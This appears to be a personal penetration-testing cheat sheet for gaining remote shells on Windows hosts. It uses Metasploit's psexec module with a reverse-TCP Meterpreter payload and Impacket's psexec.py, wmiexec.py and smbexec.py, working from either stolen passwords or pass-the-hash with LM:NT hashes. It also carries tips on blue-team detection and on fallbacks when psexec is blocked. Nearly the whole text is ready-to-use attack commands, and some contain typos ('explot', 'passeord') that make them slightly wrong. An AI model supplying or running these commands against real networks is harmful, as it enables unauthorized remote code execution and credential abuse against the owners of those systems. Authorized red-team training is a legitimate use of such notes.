If we have a password:
Metasploit:
`use explot/windows/smb/psexec`

change payload because it defaults to 32bit x86
`set payload windows/x64/meterpreter/reverse_tcp`
`set rhosts <IP>`
`set smbdomain <DOMAIN> `
`set smbuser <user>`
`set smbpass <password>`
`show targets`
if you have problems with automatic try Native upload or other

note: gets picked up a lot by blue team
`background` to set shell in background
`session`
`session <num>`
use psexec.py
`psexec.py <domain>/<user>:'<passeord'@<IP_ADDRESS>`
note: no tld on domain 
note: you can remove the password part and type it if it includes a quote

If we have a SAM hash:
Metasploit:
`set payload windows/x64/meterpreter/reverse_tcp`
`set rhosts <IP>`
`unset smbdomain` if it was set otherwise dont need
`set smbuser administrator`
`set smbpass <LM_HASH>:<NT_HASH>`

use psexec.py:
`psexec.py <user>@<IP_ADDRESS> -hashes <HASH>`

Note: shells on pc arent needed to attack domain

if psexec is blocked

try:
`wmiexec.py`
`smbexec.py`
with same options as `psexec.py`